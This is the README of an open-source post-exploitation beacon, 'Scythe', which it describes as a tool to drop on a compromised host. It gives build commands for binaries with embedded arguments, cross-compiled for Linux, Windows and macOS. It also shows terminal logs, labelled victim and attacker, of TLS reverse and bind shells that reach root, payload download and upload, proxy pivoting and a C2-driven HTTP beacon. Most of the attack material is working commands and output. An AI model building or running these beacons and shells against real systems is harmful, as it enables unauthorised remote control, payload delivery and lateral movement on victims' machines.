# Scythe
All in one beacon to drop on a compromised host


## Build

* Please look at github actions or just use the dockerfile to build for your platform.

### Embedded arguments

You can compile subcommand and flags into the binary so it runs with **no command-line arguments** (e.g. `./Scythe.embedded` only). The same tokens are used as after the program name today: a JSON array of strings.

The embedded payload is just data inside the executable; **the executable must match the OS and CPU you run it on.** Build on your dev machine and pass a **target OS** to produce a standalone binary for Linux, Windows, or macOS without needing that OS locally as the build host (Go cross-compiles).

**Using the helper script** (from the repo root):

```bash
./scripts/build-embedded.sh '["Http","-url","https://example.com/api","-timeout","30s"]' ./Scythe.embedded
./scripts/build-embedded.sh '["Netcat","-reverse","-address","10.0.0.1","-port","4444","-tls"]'
```

Optional **third argument** — `linux`, `windows`, or `darwin` (aliases: `macos` for Darwin): sets `GOOS` for a cross-compile. Optional **fourth argument** — CPU / architecture (mapped to Go’s `GOARCH`). If you omit the fourth argument when cross-compiling, `GOARCH` defaults to **`amd64`** unless you set the **`GOARCH`** environment variable (e.g. `GOARCH=arm64 ./scripts/build-embedded.sh … linux`). `CGO_ENABLED=0` is set for cross-builds.

Common **architecture names** (case-insensitive):

| You pass | Go `GOARCH` |
|----------|-------------|
| `amd64`, `x86_64`, `x64` | `amd64` |
| `386`, `x86`, `i386`, `i686` | `386` |
| `arm`, `armv7`, `armv7l` | `arm` |
| `arm64`, `aarch64` | `arm64` |
| `riscv64`, `ppc64le` | same |

Other lowercase names without extra punctuation may be passed through to `go build` (e.g. `riscv64`).

```bash
./scripts/build-embedded.sh '["Http","-url","https://example.com/api","-timeout","30s"]' ./Scythe.exe windows amd64
./scripts/build-embedded.sh '["Netcat","-reverse","-address","10.0.0.1","-port","4444","-tls"]' ./Scythe.bin linux x86_64
./scripts/build-embedded.sh '["Proxy","-port","9050"]' ./Scythe.arm64 darwin arm64
./scripts/build-embedded.sh '["Proxy","-port","9050"]' ./Scythe-linux-arm linux arm
GOARCH=arm64 ./scripts/build-embedded.sh '["Proxy","-port","9050"]' ./Scythe.arm64-linux linux   # fourth arg omitted: env sets arch
```

Omit the third (and fourth) argument to build for **whatever OS/arch you are running `go build` on** (native).

Default output filename is `./Scythe.embedded` if you omit the second argument.

**Generating JSON safely (recommended for real invocations):** hand-written JSON breaks easily when `-headers` or other values contain commas, spaces, or quotes. Build the same token list you would pass on the CLI, serialize with Python, then pass the result to the script (the script base64-encodes it for `-ldflags`; you do not need to run `base64` yourself).

One-liner (short example):

```bash
JSON=$(python3 -c 'import json; print(json.dumps(["Http","-timeout","5s","-url","http://127.0.0.1:8080","-headers","Content-Type:application/json,X-Client-Id:abc"]))'
./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
```

Long values (e.g. full `User-Agent`, multiple headers): use a small heredoc so the strings stay readable:

```bash
JSON=$(python3 <<'PY'
import json
print(json.dumps([
    "Http",
    "-timeout", "5s",
    "-url", "http://10.0.0.1:8080",
    "-directories", "/heartbeat,/heartbeat/uuid-here",
    "-headers",
    "Content-Type:application/json,X-Client-Id:...,X-API-Secret:...,User-Agent:Mozilla/5.0 ...",
]))
PY
)
./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
```

**Network subcommands (Netcat, FileTransfer, Proxy):** same idea—embed the exact token list you would pass after `./Scythe` (addresses, ports, `-tls`, `-proxy`, etc.). Use Python whenever a value is awkward to quote in JSON.

Helper script (inline JSON):

```bash
./scripts/build-embedded.sh '["Proxy","-port","9050"]' ./Scythe.embedded
./scripts/build-embedded.sh '["Netcat","-reverse","-address","10.0.0.1","-port","4444","-tls"]' ./Scythe.embedded
./scripts/build-embedded.sh '["FileTransfer","-listen","-port","8080","-filename","payload.bin","-tls"]' ./Scythe.embedded
```

One-liner (Netcat reverse with SOCKS5):

```bash
JSON=$(python3 -c 'import json; print(json.dumps(["Netcat","-reverse","-address","10.10.10.10","-port","8000","-proxy","127.0.0.1:9050","-tls"]))'
./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
```

Longer network argv (paths, hostnames, proxy): heredoc keeps flags readable:

```bash
JSON=$(python3 <<'PY'
import json
print(json.dumps([
    "FileTransfer",
    "-download",
    "-filename", "somebadfile.exe",
    "-hostname", "10.10.10.10",
    "-port", "8080",
    "-proxy", "172.17.0.2:1080",
    "-tls",
]))
PY
)
./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
```

**Manual `go build`:** take the same `JSON` variable as above (Http or network), then base64 (no newlines) and link. For a **non-native** OS/arch, set `GOOS`, `GOARCH`, and `CGO_ENABLED=0`:

```bash
JSON=$(python3 -c 'import json; print(json.dumps(["Http","-url","https://example.com","-timeout","30s"]))')
B64=$(printf '%s' "$JSON" | base64 | tr -d '\n')
GOOS=linux GOARCH=arm64 CGO_ENABLED=0 go build -trimpath \
  -ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
  -o Scythe-linux-arm64 ./cmd
```

```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -trimpath \
  -ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
  -o Scythe.exe ./cmd
```

Native build (omit `GOOS` / `GOARCH` or set them to match your machine):

```bash
go build -trimpath \
  -ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
  -o Scythe.embedded ./cmd
```

**Runtime:** run the binary with no extra arguments to use the embedded argv. If you invoke it with any arguments (e.g. `./Scythe.embedded Http -url …`), those are used instead and embedded defaults are ignored.

## Netcat

Remember to use --proxy if you plan to pivot between hosts

### Reverse Shell

* Victim:

```
root@f44b79805a1e:~/cmd# ./ScytheLinux Netcat --address 172.17.0.2 --reverse --port 8000 --tls
2024/06/13 22:45:18 [*] Rev shell spawning, connecting to 172.17.0.2:8000
2024/06/13 22:45:18 Linux

```

* Attacker:

```
root@fcbc11f4beba:~/cmd# ./ScytheLinux Netcat --listen --port 8000 --tls 
2024/06/13 22:45:06 Listener opened on :8000
2024/06/13 22:45:09 Received connection from 172.17.0.3:57398!
whoami
root

```

### Bind Shell:

* Victim:

```
root@fcbc11f4beba:~/cmd# ./ScytheLinux Netcat --bind --port 8000 --tls
2024/06/13 22:45:57 [*] Binding shell spawning for remote code execution
2024/06/13 22:46:02 Received connection from 172.17.0.3:49050!

```

* Attacker:

```
root@f44b79805a1e:~/cmd# ./ScytheLinux Netcat --address 172.17.0.2 --caller --port 8000 --tls
2024/06/13 22:46:02 [*] Bind shell spawning, connecting to 172.17.0.2:8000
whoami
root

```

## File Transfer

### Download

* Victim

```
./Scythe.exe FileTransfer --download --filename somebadfile.exe --hostname 10.10.10.10 --port 8080 --tls
```

* Attacker

```
./Scythe FileTransfer --listen --port 8080 --tls
```


### Upload

* Attacker

```
./Scythe.exe FileTransfer --filename somebadfile.exe --port 8080 --send --tls
```

* Victim

```
./Scythe.exe FileTransfer --listen --filename somebadfile.exe --port 8080 --tls
```

## Proxy

* Proxy server

```
./Scythe Proxy --port 9050
```

* Victim Reverse Shell

```
./Scythe.exe Netcat --address 10.10.10.10 --reverse --port 8000 --proxy 172.17.0.2 --tls
```

* Attacker

```
./ScytheLinux Netcat --listen --port 8000 --tls
```

## HTTP

### HTTP Test Server

* Use this to test your HTTP requests.

```
virtualenv -p python3 ~/development/virtual_env/flask
source ~/development/virtual_env/flask/bin/activate
pip install flask
python3 -m http.server
```

* Use this command to test different requests
* Spin up a Listener and Proxy if you want to test those features

```
./Scythe Http --method GET --timeout 5s --url http://127.0.0.1:5000 --directories /index.js,/index.html,/first-dir/index.js,/first-dir/index.html,/command.js,/server.py,/first-dir/dir.js/server.py,/requirements.py
```

### HTTP beacon built-ins (no shell, no `exec` of the Unix tool names)

When the C2 JSON response includes a `Commands` array (e.g. from [ReaperC2](https://github.com/BuildAndDestroy/ReaperC2)), each string is handled inside the Scythe process: **`whoami`**, **`groups`**, **`env`**, and **`environment`** use Go’s **`os/user`** and **`os.Environ()`** only (same *idea* as in-process BOF-style work: no reliance on `/usr/bin/env`, `cmd.exe`, or a shell). They are matched case-insensitively after trimming; surrounding `"` / `'` / smart quotes are stripped if the whole token is wrapped that way.

**ReaperC2:** the admin **Download Scythe.embedded** build uses the **`third_party/Scythe` git submodule**. If you still see `exec: "environment": executable file not found`, the submodule is almost certainly pinned to an **old Scythe** without these built-ins. From the ReaperC2 repo root run `git submodule update --init --recursive`, pull this submodule to the commit that contains the built-in commands, then regenerate the embedded binary (or build Scythe from this repo directly).
